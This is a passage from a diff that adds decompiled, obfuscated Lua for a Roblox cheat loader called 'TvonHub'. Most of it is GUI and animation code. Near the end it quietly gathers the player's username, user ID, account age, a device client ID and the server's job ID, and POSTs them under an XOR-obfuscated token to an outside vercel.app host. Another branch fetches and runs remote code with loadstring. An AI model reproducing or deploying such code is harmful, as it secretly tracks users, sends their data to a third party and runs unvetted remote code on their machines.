+			v_u_161:Create(v_u_241, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["TextTransparency"] = 0
+			}):Play()
+		end)
+		v_u_236.MouseLeave:Connect(function()
+			-- upvalues: (ref) v_u_161, (ref) v_u_236, (ref) v_u_238, (ref) v_u_241
+			v_u_161:Create(v_u_236, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 30, 0, 30)
+			}):Play()
+			v_u_161:Create(v_u_238, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Position"] = UDim2.new(0.5, 0, 0.5, 0)
+			}):Play()
+			v_u_161:Create(v_u_241, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["TextTransparency"] = 2
+			}):Play()
+		end)
+		v237.CornerRadius = UDim.new(0, 7)
+		v237.Parent = v_u_236
+		v_u_238.Parent = v_u_236
+		v_u_238.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_238.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_238.BackgroundTransparency = 2
+		v_u_238.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_238.BorderSizePixel = 0
+		v_u_238.Position = UDim2.new(0.5, 0, 0.5, 0)
+		v_u_238.Size = UDim2.new(0, 20, 0, 20)
+		v_u_238.Image = "rbxassetid://11423157473"
+		v_u_238.ImageColor3 = Color3.fromRGB(51, 55, 66)
+		v239.Name = "DropShadow"
+		v239.Parent = v_u_236
+		v239.AnchorPoint = Vector2.new(0.5, 0.5)
+		v239.BackgroundTransparency = 1
+		v239.BorderSizePixel = 0
+		v239.Position = UDim2.new(0.5, 0, 0.5, 0)
+		v239.Size = UDim2.new(1, 26, 1, 26)
+		v239.ZIndex = 0
+		v239.Image = "rbxassetid://6015897843"
+		v239.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v239.ImageTransparency = 0.5
+		v239.ScaleType = Enum.ScaleType.Slice
+		v239.SliceCenter = Rect.new(49, 49, 450, 450)
+		v240.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(184, 197, 239)), ColorSequenceKeypoint.new(1, Color3.fromRGB(87, 93, 113)) })
+		v240.Rotation = 45
+		v240.Parent = v_u_236
+		v_u_241.Name = "RunText"
+		v_u_241.Parent = v_u_236
+		v_u_241.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_241.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_241.BackgroundTransparency = 2
+		v_u_241.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_241.BorderSizePixel = 0
+		v_u_241.Position = UDim2.new(0.5, 0, 0.5, 0)
+		v_u_241.Size = UDim2.new(0, 111, 0, 30)
+		v_u_241.Font = Enum.Font.SourceSansBold
+		v_u_241.Text = "\239\191\189\216\180\216\186\217\138\217\132"
+		v_u_241.TextColor3 = Color3.fromRGB(54, 58, 70)
+		v_u_241.TextSize = 14
+		v_u_241.TextTransparency = 2
+		v_u_241.TextXAlignment = Enum.TextXAlignment.Center
+		v242.Parent = v_u_164
+		local v259 = identifyexecutor()
+		v195.Text = "\239\191\189\216\174\216\177 \216\170\216\173\216\175\217\138\216\171 : " .. "2025/9/11" .. "\n\216\167\217\132\216\177\216\167\217\134\217\131 : " .. v17() .. "\n \216\167\217\132\217\135\216\167\217\131 : " .. v259 .. "\n \216\167\217\138\216\175\217\138 \216\167\217\132\216\172\217\136\216\168 : " .. game.JobId
+		local v_u_260 = 0.7
+		local function v_u_261()
+			-- upvalues: (ref) v_u_175, (ref) v_u_197, (ref) v_u_201
+			v_u_175.Visible = false
+			v_u_197.Visible = false
+			v_u_201.Visible = false
+		end
+		local function v265(p262, p263)
+			local v_u_264 = p263 or function() end
+			p262.MouseButton1Click:Connect(function()
+				-- upvalues: (ref) v_u_264
+				pcall(v_u_264)
+			end)
+		end
+		local v266 = v_u_161
+		v_u_161.Create(v266, v_u_227, TweenInfo.new(v_u_260), {
+			["TextColor3"] = Color3.fromRGB(255, 255, 255)
+		}):Play()
+		local v267 = v_u_161
+		v_u_161.Create(v267, v_u_226, TweenInfo.new(v_u_260), {
+			["ImageColor3"] = Color3.fromRGB(255, 255, 255)
+		}):Play()
+		v265(v224, function()
+			-- upvalues: (ref) v_u_261, (ref) v_u_175, (ref) v_u_161, (ref) v_u_227, (ref) v_u_260, (ref) v_u_226, (ref) v_u_231, (ref) v_u_235, (ref) v_u_230, (ref) v_u_234
+			v_u_261()
+			v_u_175.Visible = true
+			v_u_161:Create(v_u_227, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_226, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_231, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_235, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_230, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_234, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+		end)
+		v265(v228, function()
+			-- upvalues: (ref) v_u_261, (ref) v_u_197, (ref) v_u_161, (ref) v_u_231, (ref) v_u_260, (ref) v_u_230, (ref) v_u_227, (ref) v_u_235, (ref) v_u_234, (ref) v_u_226
+			v_u_261()
+			v_u_197.Visible = true
+			v_u_161:Create(v_u_231, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_230, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_227, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_235, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_234, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_226, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+		end)
+		v265(v232, function()
+			-- upvalues: (ref) v_u_261, (ref) v_u_201, (ref) v_u_161, (ref) v_u_235, (ref) v_u_260, (ref) v_u_234, (ref) v_u_227, (ref) v_u_231, (ref) v_u_230, (ref) v_u_226
+			v_u_261()
+			v_u_201.Visible = true
+			v_u_161:Create(v_u_235, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_234, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(255, 255, 255)
+			}):Play()
+			v_u_161:Create(v_u_227, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_231, TweenInfo.new(v_u_260), {
+				["TextColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_230, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+			v_u_161:Create(v_u_226, TweenInfo.new(v_u_260), {
+				["ImageColor3"] = Color3.fromRGB(184, 197, 239)
+			}):Play()
+		end)
+		local v_u_268 = Instance.new("ScreenGui")
+		local v_u_269 = Instance.new("ImageLabel")
+		v_u_268.Name = "TvonHubLoaderIntroGui"
+		v_u_268.Parent = game.CoreGui
+		v_u_268.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		v_u_269.Name = "TvonIconIntro"
+		v_u_269.Parent = v_u_268
+		v_u_269.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_269.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_269.BackgroundTransparency = 2
+		v_u_269.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_269.BorderSizePixel = 0
+		v_u_269.Position = UDim2.new(0.5, 0, 0.5, 0)
+		v_u_269.Size = UDim2.new(0, 0, 0, 0)
+		v_u_269.Image = "http://www.roblox.com/asset/?id=107247194999685"
+		v_u_269.ImageTransparency = 2
+		function _G.RunAnim()
+			-- upvalues: (ref) v_u_161, (ref) v_u_167, (ref) v_u_164, (ref) v_u_165, (ref) v_u_269, (ref) v_u_268, (ref) v_u_163
+			wait(1)
+			v_u_161:Create(v_u_167, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 2
+			}):Play()
+			v_u_161:Create(v_u_164, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 2
+			}):Play()
+			wait(1)
+			v_u_165.ClipsDescendants = true
+			v_u_161:Create(v_u_269, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 0
+			}):Play()
+			v_u_161:Create(v_u_269, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 200, 0, 200)
+			}):Play()
+			v_u_161:Create(v_u_165, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 0, 0, 0)
+			}):Play()
+			task.wait(2)
+			v_u_161:Create(v_u_269, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 0, 0, 0)
+			}):Play()
+			v_u_161:Create(v_u_269, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 2
+			}):Play()
+			wait(1)
+			v_u_268:Destroy()
+			v_u_163:Destroy()
+		end
+		spawn(function()
+			-- upvalues: (ref) v_u_161, (ref) v_u_269, (ref) v_u_165, (ref) v_u_167, (ref) v_u_164
+			v_u_161:Create(v_u_269, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 0
+			}):Play()
+			v_u_161:Create(v_u_269, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 200, 0, 200)
+			}):Play()
+			task.wait(2)
+			v_u_161:Create(v_u_165, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 400, 0, 300)
+			}):Play()
+			v_u_161:Create(v_u_269, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 2
+			}):Play()
+			v_u_161:Create(v_u_269, TweenInfo.new(1.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 0, 0, 0)
+			}):Play()
+			wait(1.8)
+			v_u_165.ClipsDescendants = false
+			v_u_161:Create(v_u_167, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 0.5
+			}):Play()
+			v_u_161:Create(v_u_164, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["ImageTransparency"] = 0
+			}):Play()
+		end)
+		v162:AddUpdate({
+			["Name"] = "v8.0"
+		}):AddLabel({
+			["Text"] = "idk"
+		})
+		local v270 = game:GetService("HttpService")
+		local v271 = game.Players.LocalPlayer
+		local v272 = game:GetService("RbxAnalyticsService"):GetClientId()
+		local v273 = identifyexecutor() or "Unknown"
+		local v274 = DateTime.now():ToIsoDate()
+		local v279 = {
+			["token"] = (function(p275, p276)
+				local v277 = {}
+				for v278 = 1, #p275 do
+					v277[v278] = string.char(bit32.bxor(p275:byte(v278), p276:byte((v278 - 1) % #p276 + 1)))
+				end
+				return table.concat(v277)
+			end)("SnoobeOnTopYa87bh@$$@#$@#$", "TvonKey123"),
+			["payload"] = {
+				["embeds"] = {
+					{
+						["title"] = "\n TvonHub | Webhook",
+						["description"] = "**\216\167\217\132\217\138\217\136\216\178\216\177:**" .. "```" .. v271.Name .. "```" .. "**\216\167\217\138\216\175\217\138 \216\167\217\132\217\138\217\136\216\178\216\177:**" .. "```" .. v271.UserId .. "```" .. "**\216\185\217\133\216\177 \216\167\217\132\216\173\216\179\216\167\216\168: **" .. "```" .. v271.AccountAge .. "```" .. "**\216\177\216\167\216\168\216\183 \216\167\217\132\216\173\216\179\216\167\216\168: **" .. "```" .. "https://www.roblox.com/users/" .. v271.UserId .. "```\n\n",
+						["timestamp"] = v274,
+						["type"] = "rich",
+						["color"] = tonumber(16711680),
+						["fields"] = {
+							{
+								["name"] = "\239\191\189\217\132\217\133\216\167\216\168",
+								["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
+								["inline"] = true
+							},
+							{
+								["name"] = "\239\191\189\217\138\216\175\217\138 \216\167\217\132\217\133\216\167\216\168",
+								["value"] = "```" .. game.PlaceId .. "```",
+								["inline"] = true
+							},
+							{
+								["name"] = "\239\191\189\217\136\216\185 \216\167\217\132\217\135\216\167\217\131",
+								["value"] = "```" .. v273 .. "```",
+								["inline"] = true
+							},
+							{
+								["name"] = "HWID",
+								["value"] = "```" .. v272 .. "```",
+								["inline"] = true
+							},
+							{
+								["name"] = "\239\191\189\217\131\216\177\216\168\216\170 \216\167\217\132\216\172\217\136\217\138\217\134",
+								["value"] = "```js\ngame:GetService(\'TeleportService\'):TeleportToPlaceInstance(" .. game.PlaceId .. ", \'" .. game.JobId .. "\')```",
+								["inline"] = true
+							}
+						}
+					}
+				}
+			}
+		}
+		local v280 = v270:JSONEncode(v279);
+		(http_request or request or (HttpPost or syn.request))({
+			["Url"] = "https://test-rose-sigma-59.vercel.app/",
+			["Body"] = v280,
+			["Method"] = "POST",
+			["Headers"] = {
+				["Content-Type"] = "application/json"
+			}
+		})
+		print("Tvon Loaded !")
+	end
+else
+	loadstring(game:HttpGet("https://tvon.pages.dev/lua/TBH.lua"))()
+	return
+end
